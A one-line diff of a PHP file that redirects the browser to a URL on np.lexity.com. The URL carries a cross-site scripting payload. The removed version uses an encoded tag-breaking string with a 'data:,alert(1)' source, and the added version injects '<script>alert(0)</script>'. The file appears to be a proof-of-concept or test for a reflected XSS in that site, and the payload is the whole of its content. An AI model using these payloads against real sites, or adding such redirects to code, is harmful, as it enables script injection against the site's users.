@@ -1,1 +1,1 @@
-<?php header('location: https://np.lexity.com/f57ea75d/h/1/v/q/k/aaa/u/xxxx/r/fff/vn/1/c/%3Cdiv%3E%22src=data:,alert%281%29%3E%3C%2fscript%3E%3Cscript%20x=%22%3C%2fdiv%3E%3Cdiv%3E%22src=data:,alert%281%29%3E%3C%2fscript%3E%3Cscript%20x=%22%3C%2fdiv%3E') ?> 
+<?php header('location: https://np.lexity.com/f57ea75d/h/1/v/q/k/aaa/u/xxxx/r/fff/vn/1/c/<script>alert(0)<%2fscript>') ?> 
